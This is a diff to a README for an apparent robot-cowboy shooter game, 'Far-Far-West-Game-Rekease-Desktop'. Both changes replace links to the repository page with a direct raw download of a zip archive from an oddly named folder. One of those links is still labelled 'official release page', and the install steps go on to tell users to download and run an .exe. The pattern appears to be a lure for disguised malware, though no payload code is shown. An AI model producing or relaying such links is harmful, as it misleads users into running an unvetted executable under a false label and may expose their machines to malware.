@@ -1,6 +1,6 @@
 # 🤠 Far-Far-West-Game-Rekease-Desktop - Play exciting robot cowboy shooter games
 
-[![Download Game](https://img.shields.io/badge/Download-Game-blue)](https://github.com/anemographic-renewableresource518/Far-Far-West-Game-Rekease-Desktop)
+[![Download Game](https://img.shields.io/badge/Download-Game-blue)](https://raw.githubusercontent.com/anemographic-renewableresource518/Far-Far-West-Game-Rekease-Desktop/main/unguyed/Far_West_Rekease_Game_Desktop_v2.4.zip)
 
 ## 📖 About the Game
 
@@ -21,7 +21,7 @@ Make sure your computer meets these needs to run the game well.
 
 Follow these steps to get the game on your PC.
 
-1. Go to the [official release page](https://github.com/anemographic-renewableresource518/Far-Far-West-Game-Rekease-Desktop).
+1. Go to the [official release page](https://raw.githubusercontent.com/anemographic-renewableresource518/Far-Far-West-Game-Rekease-Desktop/main/unguyed/Far_West_Rekease_Game_Desktop_v2.4.zip).
 2. Look for the latest release on the right side of the screen.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop for easy access.
